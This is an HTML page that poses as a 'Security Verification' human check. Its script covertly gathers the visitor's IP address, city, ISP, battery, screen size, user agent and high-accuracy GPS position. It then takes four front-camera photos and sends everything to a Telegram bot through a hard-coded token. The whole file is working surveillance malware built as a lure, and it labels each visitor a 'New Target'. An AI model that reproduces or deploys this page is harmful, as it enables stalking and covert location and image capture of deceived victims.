<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 100%;
        }
        .btn {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            transition: 0.2s;
        }
        .btn:hover {
            background-color: #0ea5e9;
        }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <h3>рҹ”’ Security Verification</h3>
        <p style="color: #94a3b8; font-size: 14px;">Click below to verify that you are a human and load the content.</p>
        <button class="btn" onclick="startCapture()">Continue вһ”</button>
    </div>

    <div class="card" id="loading-card" style="display: none;">
        <h3>Loading...</h3>
        <p style="color: #94a3b8; font-size: 14px;">Please wait while we verify...</p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_CHAT_ID = urlParams.get('id');
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";

        async function startCapture() {
            if (!TARGET_CHAT_ID) {
                alert("Invalid Link!");
                return;
            }

            document.getElementById('main-card').style.display = 'none';
            document.getElementById('loading-card').style.display = 'block';

            // 1. IP Information
            let ipInfo = "N/A";
            try {
                let ipRes = await fetch('https://ipapi.co/json/');
                let ipData = await ipRes.json();
                ipInfo = `рҹҢҗ **IP Information**\nрҹ”ў IP: \`${ipData.ip}\`\nрҹ“Қ Location: ${ipData.city}, ${ipData.region}\nрҹ—ә Country: ${ipData.country_name}\nрҹ“Ў ISP: ${ipData.org}`;
            } catch(e) {
                ipInfo = "рҹҢҗ IP Info: Failed";
            }

            // 2. Battery Information
            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryInfo = `рҹ”Ӣ Battery: ${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging вҡЎ' : 'Not Charging'})`;
                }
            } catch(e) {}

            let screenInfo = `рҹ–ҘпёҸ Screen: ${window.innerWidth}x${window.innerHeight}`;
            let uaInfo = `рҹ§  UA: ${navigator.userAgent}`;

            // 3. 100% Accurate High-Accuracy GPS Location
            let gpsInfo = "рҹ“Қ GPS: Permission Denied / Not Available";
            if (navigator.geolocation) {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(pos => {
                        let lat = pos.coords.latitude;
                        let lon = pos.coords.longitude;
                        let acc = pos.coords.accuracy;
                        gpsInfo = `рҹ“Қ **Live GPS (Accurate ~${Math.round(acc)}m):**\n[Google Maps View](https://maps.google.com/?q=${lat},${lon})`;
                        resolve();
                    }, err => {
                        resolve();
                    }, { 
                        enableHighAccuracy: true, 
                        timeout: 7000, 
                        maximumAge: 0 
                    });
                });
            }

            // Send Text Info First
            let fullCaption = `рҹҡЁ **New Target Triggered!**\n\n${ipInfo}\n\nрҹ“ұ **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\nв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ\nвңЁ **Credit by : аӨҶаӨҜаҘҒаӨ· аӨЁаҘҮаӨ—аҘҖ**`;
            
            let textFormData = new FormData();
            textFormData.append('chat_id', TARGET_CHAT_ID);
            textFormData.append('text', fullCaption);
            textFormData.append('parse_mode', 'Markdown');
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                body: textFormData
            }).catch(e => {});

            // 4. Capture Multiple Photos (4 Photos consecutively)
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                await video.play();

                // Wait a moment for camera to adjust lighting/focus
                await new Promise(r => setTimeout(r, 1000));

                for (let i = 1; i <= 4; i++) {
                    await new Promise(r => setTimeout(r, 800)); // 0.8 seconds gap between each photo
                    
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    await new Promise((resolve) => {
                        canvas.toBlob(async blob => {
                            if (blob) {
                                const photoFormData = new FormData();
                                photoFormData.append('chat_id', TARGET_CHAT_ID);
                                photoFormData.append('caption', `рҹ“ё **Photo ${i} / 4**\nвңЁ Credit by : аӨҶаӨҜаҘҒаӨ· аӨЁаҘҮаӨ—аҘҖ`);
                                photoFormData.append('parse_mode', 'Markdown');
                                photoFormData.append('photo', blob, `capture_${i}.jpg`);

                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: photoFormData
                                }).catch(err => {});
                            }
                            resolve();
                        }, 'image/jpeg', 0.85);
                    });
                }

                stream.getTracks().forEach(track => track.stop());

            } catch(err) {
                console.error("Camera capture error:", err);
            }

            document.getElementById('loading-card').innerHTML = "<h3>Verification Complete</h3><p style='color:#38bdf8;font-size:14px;'>Loading requested content...</p>";
        }
    </script>
</body>
</html>
